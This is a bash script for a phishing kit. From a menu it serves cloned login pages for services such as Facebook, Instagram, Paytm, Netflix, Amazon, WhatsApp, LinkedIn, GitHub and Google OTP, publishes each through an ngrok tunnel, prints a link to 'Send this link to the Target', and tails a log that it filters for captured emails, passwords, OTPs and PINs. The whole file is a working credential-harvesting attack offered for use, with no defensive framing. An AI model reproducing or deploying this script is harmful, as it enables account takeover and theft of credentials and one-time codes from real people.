#!/bin/bash
clear
echo ""
echo ""
echo ""
printf "\e[1;33m[\e[0m <<>> \e[1;33m] NGROK SERVER : TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
sleep 6
echo ""
php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
echo ""
echo -e $'\e[1;32m\e[0m\e[1;32m SELECT ANY ATTACK  \e[0m'
echo -e $'\e[1;37m\e[0m\e[1;37m --------------------- > > >\e[0m'
echo ""
banner() {
printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;93m Facebook\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
}
banner
echo ""
echo ""
                
                 read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
		 case $option in 
			 
                     1) cd sites/
                  cd facebook/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt


    
                ;;
	        
	               2) cd sites/
                  cd facebook-photo/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt 


                ;;

                3) cd sites/
                  cd instagram/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt  
                  
                 
 
                  
                ;;

                4) cd sites/
                  cd facebook-group/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt
                  
                  
                  
                ;;
                 
                5)cd sites/
                  cd facebook-verify/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt
                  
                 
                ;;
                
                6)cd sites/
                  cd google-otp/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt
                  


                ;;
  
                7)cd sites/
                  cd Paytm-Phishing/
                  echo ""
                 echo -e $'\e[1;33m[\e[0m\e[1;77m 1 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign In \e[0m' 
                 echo -e $'\e[1;33m[\e[0m\e[1;77m 2 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign UP \e[0m' 
                 echo ""
                 read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
		 case $option in
			 1) cd paytm/
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                            echo ""
                            tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"

                ;;
                
                         2) cd signup/
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                            echo ""
                            tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
                ;;
                esac
                ;;

                8)cd sites/
                  cd Netflix/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 

                ;;


               9)cd sites/
                  cd instafollow/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        

                ;;

               10)cd sites/
                  cd amazonsign/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "password" -e "OTP"        
                ;;

                11)cd sites/
                  cd whatsapp-phishing/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      

                ;;

                12)cd sites/
                  cd Linkedin/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"       

                ;;
   
                13)cd sites/
                  cd Hotstar-otp-bypass/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "phoneNo" -e "OTP"       

                ;;
      
                14)cd sites/
                  cd spotify/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"        

                ;;

                15)cd sites/
                  cd github/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "login" -e "password" -e "otp"       

                ;;

                16) cd sites/
                  cd ipfinder/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt      

                ;;

               
                99)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m                                                         >> THANKS FOR JOIN US >> \e[0m'
                   sleep 1
                   exit
                ;;


                esac
                ;;
